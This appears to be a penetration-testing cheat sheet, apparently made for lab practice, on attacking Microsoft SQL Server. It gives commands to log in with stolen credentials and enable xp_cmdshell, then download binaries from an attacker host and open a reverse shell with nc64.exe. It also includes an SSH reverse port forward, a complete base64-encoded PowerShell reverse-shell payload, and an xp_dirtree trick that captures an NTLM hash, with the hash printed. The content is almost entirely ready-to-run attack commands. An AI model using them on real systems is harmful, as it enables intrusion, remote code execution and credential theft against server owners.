# (1433) MSSQL

<details>

<summary>Connecting to MSSQL</summary>

```sh
/usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.129.62.217 -windows-auth
```

* May not need `-windows-auth`

```bash
sqsh -S <server’s ip> -U <username> -P <password>
```

</details>

<details>

<summary>CrackMapExec MSSQL Execute OS Commands</summary>

### CMD Commands:

```bash
proxychains -q crackmapexec mssql 10.10.105.148 -u sql_svc -p Dolphin1 -x "curl http://10.10.105.147:8000/reverse.exe --output c:\temp\reverse.exe"
```

### PS Commands:

```bash
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'
```

</details>

<details>

<summary>Activating xp_cmdshell</summary>

<pre><code><strong>EXEC sp_configure 'show advanced options', 1;
</strong></code></pre>

```
RECONFIGURE;
```

```
sp_configure;
```

```
EXEC sp_configure 'xp_cmdshell', 1;
```

```
RECONFIGURE;
```

</details>

<details>

<summary>Obtaining reverse shell from MSSQL</summary>

* Download the nc64.exe from [here](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post\_page-----a2ddc3557403----------------------) or `cp /usr/share/windows-resources/binaries/nc.exe .`

```sh
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
http://10.10.14.9/nc64.exe -outfile nc64.exe"
```

* Bind `cmd.exe` through nc and connect back to listener

```sh
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
10.10.14.9 443"
```

### OR

On attacker:

```
sudo python3 /usr/local/bin/smbserver.py share .
```

* May need `-smb2support`switch

On victim:

```bash
exec xp_cmdshell "copy \\10.10.14.68\share\reverse.exe ."
```

### OR&#x20;

* Able to reach attacker from MS01
* Unable to reach attacker from MS02 (where MSSQL exists)

#### Setup SSH Reverse Port Forward to remote server

On attacker:

```bash
ssh web_svc@192.168.218.147 -N -R *:7777:localhost:7777 
```

#### Create Powershell Reverse shell payload

* Reverse IP is the internal IP of MS01
* Reverse Port is 7777

On attacker:

```bash
wget https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py
python3 mkpsrevshell.py 10.10.108.147 7777
# powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwADgALg
```

#### Use xp\_cmdshell to run powershell rev shell payload

```sql
SQL> EXEC sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;

SQL> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwADgALgAxADQANwAiACwANwA3ADcANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

#### Obtain Rev shell

```bash
┌──(root㉿kali)-[/prac_oscp/ad_set2]
└─# nc -lvp 7777
listening on [any] 7777 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 39614

PS C:\Windows\system32> whoami
nt service\mssql$sqlexpress
PS C:\Windows\system32> 

```

</details>

<details>

<summary>Capture MSSQL credentials with xp_dirtree</summary>

[https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478](https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478)

* Setup the smbserver
  * Depends if `-smb2support` is needed

```bash
python3 /usr/local/bin/smbserver.py share . -smb2support
```

* Login to MSSQL server

```bash
/usr/share/doc/python3-impacket/examples/mssqlclient.py reporting@10.10.10.125 -windows-auth
```

* Run the `xp_dirtree` command to connect to our smbserver

```sql
EXEC master.sys.xp_dirtree '\\\\10.10.14.6\\share',1, 1
```

* Obtained the hash for `mssql-svc` account

```bash
mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:533f791f193e74c54f52806542c622ee:010100000000000000aa4a71c657d90177d39b57c2e762eb0000000001001000500075004b0071004900470061006f0003001000500075004b0071004900470061006f000200100056004d004a00510070006900760073000400100056004d004a00510070006900760073000700080000aa4a71c657d901060004000200000008003000300000000000000000000000003000007f0fd403abd9b83ec1da57b18ed542302ab365d2b86e14497a32441ca7a2abe60a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003600000000000000000000000000
```

</details>
